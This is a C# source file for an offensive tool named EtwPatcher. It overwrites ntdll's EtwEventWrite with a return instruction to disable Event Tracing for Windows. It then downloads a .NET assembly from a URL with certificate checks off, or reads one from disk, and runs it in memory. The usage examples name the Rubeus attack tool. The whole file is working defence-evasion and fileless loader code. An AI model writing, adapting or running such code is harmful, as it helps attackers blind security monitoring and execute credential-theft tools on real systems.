using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.Threading.Tasks;

namespace EtwPatcher
{
    internal class Program
    {

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi, SetLastError = true)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("ws2_32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern Int32 WSAGetLastError();
        static bool BypassETW()
        {
            uint oldProtect = 0;
            try
            {
                IntPtr hProc = Process.GetCurrentProcess().Handle;
                IntPtr hModule = LoadLibrary("ntdll.dll");
                IntPtr hfunction = GetProcAddress(hModule, "EtwEventWrite");
                var patch = new byte[] { 0xC3 };

                VirtualProtect(hfunction, (UIntPtr)patch.Length, 0x04, out oldProtect);
                Marshal.Copy(patch, 0, hfunction, patch.Length);
                VirtualProtect(hfunction, (UIntPtr)patch.Length, oldProtect, out _);
                return true;
            }
            catch
            {
                Console.WriteLine("Error unhooking ETW: "+WSAGetLastError());
                return false;
            }
        }

        public static void GetUsage()
        {
            var info = "Usage:\n etwPatcher [<file> | <url>] [<args>]\nExamples:\n etwPatcher .\\Rubeus.exe\n etwPatcher .\\Rubeus.exe triage\n etwPatcher https:\\\\servdata.local\\Rubeus.exe triage\n\n";
            Console.Write(info);
        }
        static async Task Main(string[] args)
        {
            if (args.Length == 0)
            {
                GetUsage();
                return;
            }

            if (!BypassETW())
            {
                return;
            }
            byte[] rbytes;

            var source = args[0];


            if (source.Split(':')[0] == "https" || source.Split(':')[0] == "http")
            {
                using (var handler = new HttpClientHandler())
                {
                    handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;

                    using (var client = new HttpClient(handler))
                    {
                        rbytes = await client.GetByteArrayAsync(source);
                    }
                }
            }
            else
            {
                rbytes = File.ReadAllBytes(source);
            }
            
            var assembly = Assembly.Load(rbytes);
            assembly.EntryPoint.Invoke(null, new object[] { args.Skip(1).ToArray() });
        }
    }
}
